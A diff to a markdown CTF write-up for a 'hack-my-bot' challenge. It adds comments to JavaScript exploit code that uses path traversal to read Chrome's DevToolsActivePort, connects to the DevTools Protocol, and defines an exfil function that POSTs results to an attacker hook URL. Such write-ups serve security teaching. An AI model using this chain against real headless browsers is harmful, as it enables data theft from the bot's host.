@@ -697,13 +697,17 @@ Let's illustrate that in code:
 ```js
 (async () => {
     try {
+		// grab devtools endpoint via path traversal
         const r = await fetch(
             "http://localhost/logs../browser_cache/DevToolsActivePort"
         ).then((r) => r.text());
         let [port, path] = r.split("\n");
+
+		// connect to CDP in browser context
         const devTools = `http://localhost:${port}${path}`;
         const ws = new WebSocket(devTools);
 
+		// utility function to exfiltrate relevant results
         function exfil(data) {
             fetch(hook + "message", { method: "POST", body: data });
         }
@@ -766,7 +770,9 @@ Let's illustrate that in code:
 })();
 ```
 
-Running it, and if everything is correct, we get a callback with our lovely flag:
-![](posts/hack-my-bot-pwnme-2025-ctf/flag.png)
+Running our payload, and if everything is correct, we get a callback with our lovely flag:
+![](flag.png)
 
-Thank you for reading, hope you learnt something new, and see you in the next one 👋
+Notice how we got the minimal Chrome markup we see when we open a local file, pretty cool imo.
+
+That's it for this post, don't hesitate to leave your questions in the comments or hit me up on Discord **@aelmo1**.
